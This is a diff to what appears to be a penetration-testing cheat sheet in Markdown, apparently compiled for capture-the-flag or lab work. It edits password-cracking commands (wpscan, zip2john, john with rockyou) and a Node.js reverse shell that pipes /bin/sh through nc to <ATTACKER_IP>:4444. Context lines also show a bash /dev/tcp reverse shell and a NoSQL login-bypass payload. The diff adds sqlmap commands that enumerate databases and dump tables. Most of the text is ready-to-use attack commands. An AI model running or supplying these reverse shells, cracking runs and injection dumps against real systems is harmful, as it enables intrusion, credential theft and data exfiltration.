@@ -211,8 +211,8 @@ wpscan --url <TARGET_IP> -U <LOGIN> -P /usr/share/wordlists/rockyou.txt
 ## Archive Password Cracking
 
 ```bash
-zip2john <FILE_NAME>.zip > hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+zip2john <FILE_NAME>.zip > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
 ## Certificate Password Cracking
@@ -306,7 +306,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
 
 ```js
 require("child_process").exec(
-  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f"
+  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f",
 );
 ```
 
@@ -350,6 +350,22 @@ use
 
 ```
 {"username":"test","password":{"$ne":""}}
+```
+
+# SQL Injection
+
+## SQLMap Database Enumeration
+
+```bash
+sqlmap -u "<TARGET_URL>" --dbs --batch
+```
+
+```bash
+sqlmap -u "<TARGET_URL>" -D <DATABASE_NAME> --tables --batch
+```
+
+```bash
+sqlmap -u "<TARGET_URL>" -D <DATABASE_NAME> -T <TABLE_NAME> --dump --batch
 ```
 
 # Crontab
